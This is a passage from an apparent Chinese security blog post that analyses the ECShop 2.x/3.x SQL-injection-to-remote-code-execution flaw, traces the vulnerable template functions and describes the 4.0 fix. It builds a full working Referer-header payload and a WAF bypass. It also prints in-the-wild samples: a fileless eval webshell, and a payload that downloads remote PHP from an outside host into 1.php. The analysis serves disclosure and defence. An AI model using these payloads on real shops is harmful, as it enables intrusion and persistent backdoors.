+<p>要到<code>$position_style = $row[&#39;position_style&#39;];</code>还有一个条件，就是<code>$row[&#39;position_id&#39;]</code>要等于<code>$arr[&#39;id&#39;]</code>，查询结果可控，<code>arr[&#39;id&#39;]</code>同样可控。</p>
+<p>之后<code>$position_style</code>会拼接<code>&#39;str:&#39;</code>传入<code>fetch</code>函数，跟进<code>fetch</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理模板文件</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   string      $filename</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   sting      $cache_id</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  sring</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>
+<p>因为之前拼接<code>&#39;str:&#39;</code>了，所以<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>为真，然后会调用危险函数<code>$this-&gt;_eval</code>，这就是最终触发漏洞的点。但是参数在传递之前要经过<code>fetch_str</code>方法的处理，跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理字符串函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string     $source</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">    &#125;</span><br><span class="line">    $source=preg_replace(<span class="string">"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is"</span>, <span class="string">""</span>, $source);</span><br><span class="line">    <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</span><br><span class="line">    &#123;</span><br><span class="line">        $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">            $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">             $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个正则会匹配一些关键字，然后置空，主要看下最后一个正则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_replace(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;, &quot;\$this-&gt;select(&apos;\\1&apos;);&quot;, $source);</span><br></pre></td></tr></table></figure>
+<p>这个正则是将捕获到的值交于<code>$this-select()</code>函数处理。例如，<code>$source</code>的值是<code>xxx{$abc}xxx</code>，正则捕获到的group 1 就是<code>$abc</code>，然后就会调用<code>$this-select(&quot;$abc&quot;)</code>。</p>
+<p><img src="reg.png" alt=""></p>
+<p>跟进<code>select</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理&#123;&#125;标签</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   string      $tag</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  sring</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tag = stripslashes(trim($tag));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($tag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'*'</span> &amp;&amp; substr($tag, <span class="number">-1</span>) == <span class="string">'*'</span>) <span class="comment">// 注释部分</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// 变量</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            if(strpos($tag,"'") || strpos($tag,"]"))</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                 return '';</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>
+<p>当传入的变量的第一个字符是<code>$</code>，会返回由 php 标签包含变量的字符串，最终返回到<code>_eval()</code>危险函数内，执行。在返回之前，还调用了<code>$this-&gt;get_var</code>处理，跟进<code>get_var</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理smarty标签中的变量标签</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string     $val</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $moddb = explode(<span class="string">'|'</span>, $val);</span><br><span class="line">        $val = array_shift($moddb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $all = explode(<span class="string">'.$'</span>, $val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $p = implode(<span class="string">''</span>, $all);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $p = <span class="keyword">$this</span>-&gt;make_var($val);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>当传入的变量没有<code>.$</code>时，调用<code>$this-&gt;make_var</code>，跟进<code>make_var</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理去掉$的字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string     $val</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       .....</span><br></pre></td></tr></table></figure>
+<p>在这里结合<code>select</code>函数里面的语句来看，<code>&lt;?php echo $this-&gt;_var[&#39;  $val  &#39;];?&gt;</code>，要成功执行代码的话，<code>$val</code>必须要把<code>[&#39;</code>闭合，所以payload构造，从下往上构造，<code>$val</code>为<code>abc&#39;];echo phpinfo();//</code>；从<code>select</code>函数进入<code>get_var</code>的条件是第一个字符是<code>$</code>，所以payload变成了<code>$abc&#39;];echo phpinfo();//</code>；而要进入到<code>select</code>，需要被捕获，payload变成了<code>{$abc&#39;];echo phpinfo();//}</code>，这里因为payload的是<code>phpinfo()</code>，这里会被<code>fetch_str</code>函数的第一个正则匹配到，需要变换一下，所以payload变为<code>{$abc&#39;];echo phpinfo/**/();//}</code>，到这里为止，php 恶意代码就构造完成了。</p>
+<p>接下来就是把构造好的代码通过SQL注入漏洞传给<code>$position_style</code>。<br>这里可以用union select 来控制查询的结果，根据之前的流程，<code>$row[&#39;position_id&#39;]</code>和<code>$arr[&#39;id&#39;]</code>要相等，<code>$row[&#39;position_id&#39;]</code>是第二列的结果，<code>$position_style</code>是第九列的结果。<code>$arr[&#39;id&#39;]</code>传入<code>&#39; /*</code>,<code>$arr[&#39;num&#39;]</code>传入<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，<code>0x27202f2a</code>是<code>&#39; /*</code>的16进制值，也就是<code>$row[&#39;position_id&#39;]</code>的值，<code>0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>是上面构造的php代码的16进制值，也就是<code>$position_style</code>。</p>
+<p><img src="27mysql.png" alt=""></p>
+<p>结合之前的SQL漏洞的payload构造，所以最终的payload的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p>
+<p><img src="27phpinfo.png" alt=""></p>
+<p>可以看到成功的执行了<code>phpinfo()</code>。</p>
+<h4 id="ECShop-3-x-绕过"><a href="#ECShop-3-x-绕过" class="headerlink" title="ECShop 3.x 绕过"></a>ECShop 3.x 绕过</h4><p>上述的测试环境都是2.7.3的，理论上打2.x都没问题，而在3.x上是不行的，原因是3.x自带了个WAF(<code>ecshop/includes/safety.php</code>)，对所有传入的参数都做了检测，按照上面构造的 payload ，<code>union select</code> 会触发SQL注入的检测规则，有兴趣的可以去绕绕，我没绕过。。</p>
+<p>下面的测试版本为ECshop3.0，3.x版本的<code>echash</code>是<code>45ea207d7a2b68c49582d2d22adf953a</code>。<br>上面说了 <code>insert_ads</code> 函数存在注入，并且有两个可控点，<code>$arr[&#39;id&#39;]</code>和<code>$arr[&#39;num&#39;]</code>，可以将<code>union select</code>通过两个参数传递进去，一个参数传递一个关键字，中间的可以使用<code>/**/</code>注释掉，这样就不会触发WAF。</p>
+<p><img src="30phpinfo_ma.png" alt=""></p>
+<h3 id="实际攻击分析"><a href="#实际攻击分析" class="headerlink" title="实际攻击分析"></a>实际攻击分析</h3><p>上文提到该漏洞最早由知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”在2018年6月13日拦截并捕获，随后针对这个漏洞的攻击情况做了详细的监控及跟进：</p>
+<h4 id="第一阶：0day在野之“APT攻击”-2018年6月13日"><a href="#第一阶：0day在野之“APT攻击”-2018年6月13日" class="headerlink" title="第一阶：0day在野之“APT攻击” (2018年6月13日)"></a>第一阶：0day在野之“APT攻击” (2018年6月13日)</h4><p>首次捕获到 2.x 的 payload 是被用来攻击某区块链交易所网站。样本中 payload 通过HTTP 请求头的<code>Referer</code>字段植入，如下</p>
+<p><img src="payload.png" alt=""></p>
+<p>把捕获的 payload 转码出来看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://www.noxxx.com/554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;s:3:&quot;num&quot;;S:216:&quot;*/UNION select 1,0x272f2a,3,4,5,6,7,8,0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d,10#&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure>
+<p>恶意代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$a&apos;];assert(base64_decode(&apos;QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7&apos;));$a[&apos;1&#125;</span><br></pre></td></tr></table></figure>
+<p>base64部分的内容是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@EVAL(base64_decode($_POST[&apos;Nox&apos;]));</span><br></pre></td></tr></table></figure>
+<p>可以看到，没有写入 webshell，而是直接接收<code>$_POST[&#39;Nox&#39;]</code>参数，进行base64解码后直接传入<code>eval</code>函数执行代码，相当于一个无文件的 webshell ，非常隐蔽。</p>
+<p><img src="example.png" alt=""></p>
+<p>本次攻击是由一个日本ip(35.200.*.*)发起,通过攻击的手法及使用的paylaod等情况来看，并直接了当地用来攻击某著名区块链交易所，我们高度怀疑是目的性非常明确的“APT攻击”。</p>
+<h4 id="第二阶：0day在野之“黑产攻击”-（2018年8月）"><a href="#第二阶：0day在野之“黑产攻击”-（2018年8月）" class="headerlink" title="第二阶：0day在野之“黑产攻击” （2018年8月）"></a>第二阶：0day在野之“黑产攻击” （2018年8月）</h4><p>在随后整个7月都没有出现利用该漏洞攻击的记录直到8月初，在整个8月拦截捕获该0day漏洞攻击记录10余次，攻击者使用的 payload 都相同，且都是一个菲律宾IP(180.191.*.*)发起的攻击。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:3:&#123;s:3:&quot;num&quot;;s:314:&quot;/&lt;SP&gt;union&lt;SP&gt;select&lt;SP&gt;1,0x272f2a,3,4,5,6,7,8,0x7B247B24686F6D65275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79786D6157786C5832646C6446396A623235305A5735306379676E6148523063446F764C33566C5A5335745A53394E636B706A4A796B704F773D3D2729293B2F2F7D7D,10--&lt;SP&gt;-&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure>
+<p><code>// file_put_contents(&#39;1.php&#39;,file_get_contents(&#39;http://uee.me/MrJc&#39;));</code>和这篇<a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">分析文章</a>里捕获到的样本一致。</p>
+<p>从整个8月拦截的10余次攻击目标，payload等手法来看，我们认为极有可能该0day漏洞已经被流入到“高端黑产”团队，并进行了批量自动化攻击。</p>
+<h4 id="第三阶：0day曝光之“疯狂攻击”-（2018年8月31日后）"><a href="#第三阶：0day曝光之“疯狂攻击”-（2018年8月31日后）" class="headerlink" title="第三阶：0day曝光之“疯狂攻击” （2018年8月31日后）"></a>第三阶：0day曝光之“疯狂攻击” （2018年8月31日后）</h4><p>在2018年8月31日漏洞细节被公开之后，攻击数量开始增加，捕获到的 payload 也变的多种多样，漏洞被广泛利用。</p>
+<p><img src="count3.png" alt=""></p>
+<p>从这些人使用的攻击目标、手法及payload（攻击使用的payload仍然只适用于2.x版本，目前为止没有看到使用针对3.x payload攻击）等情况来看，考虑大量的“低端黑产”玩家开始加入进来，继续“疯狂”的抓鸡行动，榨干这个漏洞的最后一滴“油水”…</p>
+<h3 id="漏洞影响范围及修复"><a href="#漏洞影响范围及修复" class="headerlink" title="漏洞影响范围及修复"></a>漏洞影响范围及修复</h3><p>根据知道创宇ZoomEye网络空间搜索引擎对ECShop关键字的<a href="https://www.zoomeye.org/searchResult?q=ecshop" target="_blank" rel="noopener">搜索结果</a>，共找到42400 条历史记录。</p>
+<p><img src="zoomeye.png" alt=""></p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>目前我们分析下载最新版的ECShop 4.0里对这个漏洞进行修复：</p>
+<p>看到<code>ecshop4/ecshop/includes/lib_insert.php</code></p>
+<p><img src="patch.png" alt=""></p>
+<p>可以看到，将传递进来的<code>$arr[id]</code>和<code>$arr[num]</code>强制转换成整型，这样就没法利用这个漏洞了。</p>
+<p>另外我们注意到官方并没有发布针对老版本的(2.x和3.x)的独立修复补丁，相关老版本的用户可参考ECShop 4.0代码来修复或者直接升级到ECShop 4.0。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本次ECShop这个漏洞挖掘到漏洞利用非常有技术含量，可以算是一个经典的“二次漏洞”案例，从一个SQL注入漏洞最后完美实现转变为代码执行漏洞。另外从这个漏洞在野外实际利用的过程，也非常的“经典”，完美重现了一个0day漏洞被挖掘利用转变为“武器”后的完美历程：从被用来目标明确的“定向攻击”，再到“黑产”高端玩家，直到最后在曝光后沦为黑产“抓鸡”工具的“堕落” …</p>
+<p>感谢我们404实验室各团队小伙伴的努力～～ 我爱你们～～</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">ecshop2.x代码执行</a></li>
+<li><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析</a></li>
+<li><a href="https://www.seebug.org/vuldb/ssvid-97343" target="_blank" rel="noopener">ecshop 2.7.3 代码执行漏洞</a></li>
+<li><a href="https://www.zoomeye.org/searchResult?q=ecshop" target="_blank" rel="noopener">ZoomEye 搜索结果</a></li>
+<li><a href="https://www.yunaq.com/news/5b8ca434796db41371c1cf45/" target="_blank" rel="noopener">安全预警| ECShop全系列版本远程代码执行高危漏洞 创宇盾无需升级即可防御</a></li>
+<li><a href="https://wenku.baidu.com/view/ff7cea6f6529647d26285259.html" target="_blank" rel="noopener">二次漏洞</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/20/MetInfo-任意文件读取漏洞的修复与绕过/" rel="next" title="MetInfo 任意文件读取漏洞的修复与绕过">
+                <i class="fa fa-chevron-left"></i> MetInfo 任意文件读取漏洞的修复与绕过
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Badcode</p>
+              <p class="site-description motion-element" itemprop="description">学习经历</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-注入漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">SQL 注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码执行"><span class="nav-number">2.2.</span> <span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ECShop-3-x-绕过"><span class="nav-number">2.3.</span> <span class="nav-text">ECShop 3.x 绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实际攻击分析"><span class="nav-number">3.</span> <span class="nav-text">实际攻击分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一阶：0day在野之“APT攻击”-2018年6月13日"><span class="nav-number">3.1.</span> <span class="nav-text">第一阶：0day在野之“APT攻击” (2018年6月13日)</span></a></li><li 